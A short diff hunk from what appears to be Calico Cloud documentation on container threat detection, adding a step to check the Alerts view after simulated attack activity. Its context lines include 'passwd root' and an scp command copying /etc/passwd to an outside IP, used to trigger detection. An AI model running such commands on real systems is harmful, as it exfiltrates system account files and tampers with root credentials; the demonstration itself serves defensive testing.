@@ -47,6 +47,7 @@ Our threat detection engine also monitors activity within the containers running
    passwd root
    scp -o ConnectTimeout=3 /etc/passwd goomba@198.13.47.158:/tmp/
    ```
+   Wait another minute and look in the Calico Cloud UI in the `Activity` > `Alerts` again.
 
 --- 
 
